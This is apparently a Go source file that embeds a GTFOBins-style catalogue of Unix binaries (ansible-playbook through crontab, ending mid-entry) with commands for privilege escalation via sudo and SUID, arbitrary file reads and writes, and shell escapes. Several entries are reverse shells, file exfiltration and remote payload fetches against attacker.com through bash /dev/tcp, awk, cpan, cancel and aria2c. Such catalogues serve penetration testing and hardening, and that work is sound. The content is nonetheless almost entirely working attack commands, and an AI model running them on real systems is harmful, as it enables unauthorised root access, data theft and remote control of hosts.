package binaries

type Functions struct {
	Value string
	Type  string
}

var Data map[string]map[string][]Functions = map[string]map[string][]Functions{
	"ansible-playbook": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
`, "code"},
		},
	},
	"apt-get": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`apt-get changelog apt
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo apt-get changelog apt
!/bin/sh
`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`For this to work the target package (e.g., 'sl') must not be installed.`, "description"},
			Functions{`TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
`, "code"},
			Functions{`When the shell exits the 'update' command is actually executed.`, "description"},
			Functions{`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`, "code"},
		},
	},
	"apt": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`apt changelog apt
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo apt changelog apt
!/bin/sh
`, "code"},
			Functions{`For this to work the target package (e.g., 'sl') must not be installed.`, "description"},
			Functions{`TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl
`, "code"},
			Functions{`sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh`, "code"},
			Functions{`When the shell exits the 'update' command is actually executed.`, "description"},
		},
	},
	"ar": map[string][]Functions{
		"file-read": []Functions{
			Functions{`TF=$(mktemp -u)
LFILE=file_to_read
ar r "$TF" "$LFILE"
cat "$TF"
`, "code"},
		},
		"suid": []Functions{
			Functions{`TF=$(mktemp -u)
LFILE=file_to_read
./ar r "$TF" "$LFILE"
cat "$TF"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -u)
LFILE=file_to_read
sudo ar r "$TF" "$LFILE"
cat "$TF"
`, "code"},
		},
	},
	"aria2c": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x
`, "code"},
		},
		"command": []Functions{
			Functions{`COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x
`, "code"},
			Functions{`The remote file 'aaaaaaaaaaaaaaaa' (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. '--allow-overwrite' is needed if this is executed multiple times with the same GID.`, "description"},
			Functions{`aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa`, "code"},
		},
		"sudo": []Functions{
			Functions{`COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x
`, "code"},
		},
	},
	"arj": map[string][]Functions{
		"file-write": []Functions{
			Functions{`The archive can also be prepared offline then uploaded.`, "description"},
			Functions{`TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
arj e "$TF/a" $LDIR
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The archive can also be prepared offline then uploaded.`, "description"},
			Functions{`TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
sudo arj e "$TF/a" $LDIR
`, "code"},
		},
		"suid": []Functions{
			Functions{`The archive can also be prepared offline then uploaded.`, "description"},
			Functions{`TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
./arj e "$TF/a" $LDIR
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file appears amid some other textual information. The archive can also be downloaded then extracted offline.`, "description"},
			Functions{`TF=$(mktemp -u)
LFILE=file_to_read
arj a "$TF" "$LFILE"
arj p "$TF"
`, "code"},
		},
	},
	"arp": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo arp -v -f "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
arp -v -f "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./arp -v -f "$LFILE"
`, "code"},
		},
	},
	"as": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
as @$LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./as @$LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo as @$LFILE
`, "code"},
		},
	},
	"ash": map[string][]Functions{
		"shell": []Functions{
			Functions{`ash`, "code"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./ash`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ash`, "code"},
		},
	},
	"at": map[string][]Functions{
		"shell": []Functions{
			Functions{`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
`, "code"},
		},
		"command": []Functions{
			Functions{`The invocation will be blind, but it is possible to redirect the output to a file in a readable location.`, "description"},
			Functions{`COMMAND=id
echo "$COMMAND" | at now
`, "code"},
		},
		"sudo": []Functions{
			Functions{`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
`, "code"},
		},
	},
	"atobm": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
`, "code"},
		},
	},
	"awk": map[string][]Functions{
		"shell": []Functions{
			Functions{`awk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell.`, "description"},
			Functions{`LPORT=12345
awk -v LPORT=$LPORT 'BEGIN {
    s = "/inet/tcp/" LPORT "/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
awk '//' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./awk '//' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo awk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./awk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
	},
	"base32": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
base32 "$LFILE" | base32 --decode
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
base32 "$LFILE" | base32 --decode
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo base32 "$LFILE" | base32 --decode
`, "code"},
		},
	},
	"base64": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
base64 "$LFILE" | base64 --decode
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo base64 "$LFILE" | base64 --decode
`, "code"},
		},
	},
	"basenc": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo basenc --base64 $LFILE | basenc -d --base64
`, "code"},
		},
	},
	"bash": map[string][]Functions{
		"library-load": []Functions{
			Functions{`bash -c 'enable -f ./lib.so x'`, "code"},
		},
		"suid": []Functions{
			Functions{`./bash -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo bash`, "code"},
		},
		"file-read": []Functions{
			Functions{`It trims trailing newlines and it's not binary-safe.`, "description"},
			Functions{`export LFILE=file_to_read
bash -c 'echo "$(<$LFILE)"'
`, "code"},
			Functions{`The read file content is surrounded by the current history content.`, "description"},
			Functions{`LFILE=file_to_read
HISTTIMEFORMAT=$'\r\e[K'
history -r $LFILE
history
`, "code"},
		},
		"shell": []Functions{
			Functions{`bash`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
`, "code"},
			Functions{`Send local file using a TCP connection. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
`, "code"},
			Functions{`Fetch remote file using a TCP connection. Run 'nc -l -p 12345 < "file_to_send"' on the attacker box to send the file.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'
`, "code"},
			Functions{`This adds timestamps to the output file.`, "description"},
			Functions{`LFILE=file_to_write
HISTIGNORE='history *'
history -c
DATA
history -w $LFILE
`, "code"},
		},
	},
	"bpftrace": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'`, "code"},
			Functions{`TF=$(mktemp)
echo 'BEGIN {system("/bin/sh");exit()}' >$TF
sudo bpftrace $TF
`, "code"},
			Functions{`sudo bpftrace -c /bin/sh -e 'END {exit()}'`, "code"},
		},
	},
	"bridge": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
bridge -b "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./bridge -b "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo bridge -b "$LFILE"
`, "code"},
		},
	},
	"bundler": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be  ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`bundler help
!/bin/sh
`, "code"},
			Functions{`export BUNDLE_GEMFILE=x
bundler exec /bin/sh
`, "code"},
			Functions{`TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler exec /bin/sh
`, "code"},
			Functions{`TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')
`, "code"},
			Functions{`This spawns an interactive shell via ['irb'](/gtfobins/irb/).`, "description"},
			Functions{`TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/Gemfile
cd $TF
bundler install
`, "code"},
		},
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be  ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo bundler help
!/bin/sh
`, "code"},
		},
	},
	"busctl": map[string][]Functions{
		"shell": []Functions{
			Functions{`busctl --show-machine
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo busctl --show-machine
!/bin/sh
`, "code"},
		},
	},
	"busybox": map[string][]Functions{
		"shell": []Functions{
			Functions{`busybox sh`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`LPORT=12345
busybox httpd -f -p $LPORT -h .
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
busybox sh -c 'echo "DATA" > $LFILE'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
./busybox cat "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`It may drop the SUID privileges depending on the compilation flags and the runtime configuration.`, "description"},
			Functions{`./busybox sh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo busybox sh`, "code"},
		},
	},
	"byebug": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
byebug $TF
continue
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
./byebug $TF
continue
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
sudo byebug $TF
continue
`, "code"},
		},
	},
	"bzip2": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
bzip2 -c $LFILE | bzip2 -d
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./bzip2 -c $LFILE | bzip2 -d
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo bzip2 -c $LFILE | bzip2 -d
`, "code"},
		},
	},
	"c89": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo c89 -wrapper /bin/sh,-s .`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
c89 -x c -E "$LFILE"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_delete
c89 -xc /dev/null -o $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`c89 -wrapper /bin/sh,-s .`, "code"},
		},
	},
	"c99": map[string][]Functions{
		"file-write": []Functions{
			Functions{`LFILE=file_to_delete
c99 -xc /dev/null -o $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`c99 -wrapper /bin/sh,-s .`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo c99 -wrapper /bin/sh,-s .`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
c99 -x c -E "$LFILE"
`, "code"},
		},
	},
	"cancel": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send local file using a TCP connection. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
`, "code"},
		},
	},
	"capsh": map[string][]Functions{
		"shell": []Functions{
			Functions{`capsh --`, "code"},
		},
		"suid": []Functions{
			Functions{`./capsh --gid=0 --uid=0 --`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo capsh --`, "code"},
		},
	},
	"cat": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
cat "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./cat "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo cat "$LFILE"
`, "code"},
		},
	},
	"certbot": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
`, "code"},
		},
	},
	"check_by_ssh": map[string][]Functions{
		"shell": []Functions{
			Functions{`The shell will only last 10 seconds.`, "description"},
			Functions{`check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx`, "code"},
		},
		"sudo": []Functions{
			Functions{`The shell will only last 10 seconds.`, "description"},
			Functions{`sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx`, "code"},
		},
	},
	"check_cups": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
check_cups --extra-opts=@$LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo check_cups --extra-opts=@$LFILE
`, "code"},
		},
	},
	"check_log": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
OUTPUT=output_file
check_log -F $LFILE -O $OUTPUT
cat $OUTPUT
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
INPUT=input_file
check_log -F $INPUT -O $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
INPUT=input_file
sudo check_log -F $INPUT -O $LFILE
`, "code"},
		},
	},
	"check_memory": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
check_memory --extra-opts=@$LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo check_memory --extra-opts=@$LFILE
`, "code"},
		},
	},
	"check_raid": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo check_raid --extra-opts=@$LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
check_raid --extra-opts=@$LFILE
`, "code"},
		},
	},
	"check_ssl_cert": map[string][]Functions{
		"command": []Functions{
			Functions{`The host example.net must return a certificate via TLS`, "description"},
			Functions{`COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The host example.net must return a certificate via TLS`, "description"},
			Functions{`COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
`, "code"},
		},
	},
	"check_statusfile": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo check_statusfile $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
check_statusfile $LFILE
`, "code"},
		},
	},
	"chmod": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_change
./chmod 6777 $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_change
sudo chmod 6777 $LFILE
`, "code"},
		},
	},
	"chown": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_change
./chown $(id -un):$(id -gn) $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
`, "code"},
		},
	},
	"chroot": map[string][]Functions{
		"suid": []Functions{
			Functions{`./chroot / /bin/sh -p
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo chroot /
`, "code"},
		},
	},
	"cmp": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
cmp $LFILE /dev/zero -b -l
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./cmp $LFILE /dev/zero -b -l
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo cmp $LFILE /dev/zero -b -l
`, "code"},
		},
	},
	"cobc": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x
`, "code"},
		},
	},
	"column": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
column $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./column $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo column $LFILE
`, "code"},
		},
	},
	"comm": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo comm $LFILE /dev/null 2>/dev/null
`, "code"},
		},
	},
	"composer": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
composer --working-dir=$TF run-script x
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
./composer --working-dir=$TF run-script x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
`, "code"},
		},
	},
	"cowsay": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowsay -f $TF x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowsay -f $TF x
`, "code"},
		},
	},
	"cowthink": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowthink -f $TF x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowthink -f $TF x
`, "code"},
		},
	},
	"cp": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
`, "code"},
			Functions{`This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of 'cp' has the '--parents' option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)`, "description"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./cp $TF $LFILE
`, "code"},
			Functions{`This can copy SUID permissions from any SUID binary (e.g., 'cp' itself) to another.`, "description"},
			Functions{`LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
`, "code"},
			Functions{`This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of 'cp' has the '--parents' option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)`, "description"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo cp $TF $LFILE
`, "code"},
			Functions{`This overrides 'cp' itself with a shell (or any other executable) that is to be executed as root, useful in case a 'sudo' rule allows to only run 'cp' by path. Warning, this is a destructive action.`, "description"},
			Functions{`sudo cp /bin/sh /bin/cp
sudo cp
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
cp "$LFILE" /dev/stdout
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo "DATA" | cp /dev/stdin "$LFILE"
`, "code"},
		},
	},
	"cpan": map[string][]Functions{
		"file-download": []Functions{
			Functions{`export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
`, "code"},
			Functions{`Fetch a remote file via an HTTP GET request and store it in 'PWD'.`, "description"},
		},
		"sudo": []Functions{
			Functions{`sudo cpan
! exec '/bin/bash'
`, "code"},
		},
		"shell": []Functions{
			Functions{`'cpan' lets you execute perl commands with the '! command'.
`, "description"},
			Functions{`cpan
! exec '/bin/bash'
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -lvp RPORT' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Serve files in the local folder running an HTTP server on port 8080. Install the dependency via 'cpan HTTP::Server::Simple'.`, "description"},
			Functions{`cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
`, "code"},
		},
	},
	"cpio": map[string][]Functions{
		"shell": []Functions{
			Functions{`echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The content of the file is printed to standard output, between the cpio archive format header and footer.`, "description"},
			Functions{`LFILE=file_to_read
echo "$LFILE" | cpio -o
`, "code"},
			Functions{`The whole directory structure is copied to '$TF'.`, "description"},
			Functions{`LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | cpio -dp $TF
cat "$TF/$LFILE"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`Copies '$LFILE' to the '$LDIR' directory.`, "description"},
			Functions{`LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR
`, "code"},
		},
		"suid": []Functions{
			Functions{`The whole directory structure is copied to '$TF'.`, "description"},
			Functions{`LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | ./cpio -R $UID -dp $TF
cat "$TF/$LFILE"
`, "code"},
			Functions{`Copies '$LFILE' to the '$LDIR' directory.`, "description"},
			Functions{`LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR
`, "code"},
		},
		"sudo": []Functions{
			Functions{`echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:
`, "code"},
			Functions{`The whole directory structure is copied to '$TF'.`, "description"},
			Functions{`LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | sudo cpio -R $UID -dp $TF
cat "$TF/$LFILE"
`, "code"},
			Functions{`Copies '$LFILE' to the '$LDIR' directory.`, "description"},
			Functions{`LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR
`, "code"},
		},
	},
	"cpulimit": map[string][]Functions{
		"shell": []Functions{
			Functions{`cpulimit -l 100 -f /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./cpulimit -l 100 -f -- /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo cpulimit -l 100 -f /bin/sh`, "code"},
		},
	},
	"crash": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`crash -h
!sh
`, "code"},
		},
		"command": []Functions{
			Functions{`COMMAND='/usr/bin/id'
CRASHPAGER="$COMMAND" crash -h
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo crash -h
!sh
`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
		},
	},
	"crontab": map[string][]Functions{
		"command": []Functions{
